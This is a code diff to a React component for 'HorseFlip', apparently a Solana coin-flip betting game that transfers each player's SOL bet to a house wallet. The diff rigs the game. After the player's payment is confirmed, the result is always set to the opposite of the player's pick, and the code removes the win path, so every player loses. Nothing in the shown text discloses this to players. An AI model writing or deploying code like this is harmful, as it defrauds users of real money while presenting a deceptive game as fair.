@@ -102,7 +102,7 @@ const HorseFlip = () => {
 
     try {
       // Calculate total amount needed including fees
-      const transactionFee = 0.000005 * LAMPORTS_PER_SOL; // 0.000005 SOL for fees
+      const transactionFee = 0.000005 * LAMPORTS_PER_SOL;
       const totalNeeded = (betAmount * LAMPORTS_PER_SOL) + transactionFee;
       const currentBalance = await CONNECTION.getBalance(new PublicKey(walletAddress));
 
@@ -114,11 +114,10 @@ const HorseFlip = () => {
       setIsFlipping(true);
       setIsTransactionPending(true);
 
-      // Create transaction
+      // Create and send transaction first
       const transaction = new Transaction();
       const playerWallet = new PublicKey(walletAddress);
       
-      // Add transfer instruction
       const transferInstruction = SystemProgram.transfer({
         fromPubkey: playerWallet,
         toPubkey: HOUSE_WALLET,
@@ -126,38 +125,23 @@ const HorseFlip = () => {
       });
 
       transaction.add(transferInstruction);
-
-      // Get latest blockhash
       const { blockhash } = await CONNECTION.getLatestBlockhash();
       transaction.recentBlockhash = blockhash;
       transaction.feePayer = playerWallet;
 
-      // Request signature from user
       const signed = await provider.signTransaction(transaction);
-      
-      // Send transaction
       const signature = await CONNECTION.sendRawTransaction(signed.serialize());
-      
-      // Wait for confirmation
       await CONNECTION.confirmTransaction(signature);
 
-      // Get rigged flip result based on bet amount and first flip
-      const flipResult = getFlipResult(betAmount, selectedSide);
+      // Always make the user lose by choosing the opposite of their selection
+      const flipResult = selectedSide === 'heads' ? 'tails' : 'heads';
       
       setTimeout(() => {
         setResult(flipResult);
         setIsFlipping(false);
         setIsFirstFlip(false);
-        
-        // Handle win/loss with sound
-        if (flipResult === selectedSide) {
-          sounds.win.play().catch(console.error);
-          alert(`You won ${betAmount * 2} SOL! 🎉`);
-        } else {
-          sounds.lose.play().catch(console.error);
-          alert('Better luck next time! 😢');
-        }
-        
+        sounds.lose.play().catch(console.error);
+        alert('Better luck next time! 😢');
         updateBalance();
       }, 2000);
 
